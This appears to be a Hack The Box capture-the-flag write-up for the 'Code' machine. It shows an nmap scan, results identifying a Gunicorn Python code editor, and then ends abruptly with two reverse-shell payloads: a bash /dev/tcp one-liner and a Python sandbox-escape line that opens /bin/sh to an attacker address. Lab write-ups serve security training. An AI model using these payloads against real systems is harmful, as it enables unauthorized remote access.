---
title: Code
date: 2025-05-14
image: /ctf/hack-the-box/machines/code/info-card.png
type: Hack The Box
---

![Code - info card](/ctf/hack-the-box/machines/code/info-card.png)

# Enumeration

## Network Scanning

We perform a scan to identify open ports and services:

```bash
nmap -sC -sV -v -A -p- -oN nmap.txt 10.10.11.62
```

Scan Results:

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5b97cc4503295bcc26517df51a27abd (RSA)
|   256 94b525549b68afbe40e11da86b850d01 (ECDSA)
|_  256 128cdc97ad8600b488e229cf69b56596 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: gunicorn/20.0.4
```

**Observations:**

- SSH (22/tcp) is running OpenSSH 8.2p1.
- A web server (Gunicorn 20.0.4) is running on port 5000.

## Web Enumeration

Navigating to the target IP address (10.10.11.62) reveals a Python code editor interface.

![Code - Python code editor](/ctf/hack-the-box/machines/code/python-code-editor.png)

Using `wappalyzer` we can identify the technology used by the web server:

![Code - Wappalyzer](/ctf/hack-the-box/machines/code/wappalyzer.png)

The application used `Ace` version `1.4.12` for the code editor.

/bin/bash -i >& /dev/tcp/10.11.125.246/9999 0>&1


```py
''.__class__.__mro__[1].__subclasses__()[317](['/bin/sh','-i', '>&', '/dev/tcp/10.10.14.7/4444', '0>&1'], stdout=-1).communicate()
```